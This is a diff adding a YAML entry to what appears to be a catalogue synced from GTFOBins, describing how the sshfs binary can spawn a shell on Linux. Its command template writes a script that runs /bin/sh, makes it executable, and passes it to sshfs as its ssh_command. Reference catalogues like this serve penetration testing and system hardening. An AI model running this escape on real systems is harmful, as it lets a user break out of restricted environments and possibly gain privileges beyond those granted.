@@ -1,0 +1,28 @@
+id: gtfobins/sshfs/shell/unprivileged
+type: binary
+platform: linux
+name: sshfs
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo -e ''/bin/sh </dev/tty >/dev/tty 2>/dev/tty'' >/path/to/temp-file
+
+    chmod +x /path/to/temp-file
+
+    sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/'
+  comment: The mount dir must be writable by the invoking user.
+references:
+- https://gtfobins.github.io/gtfobins/sshfs/
+tags:
+- linux
+- unix
+- gtfobins
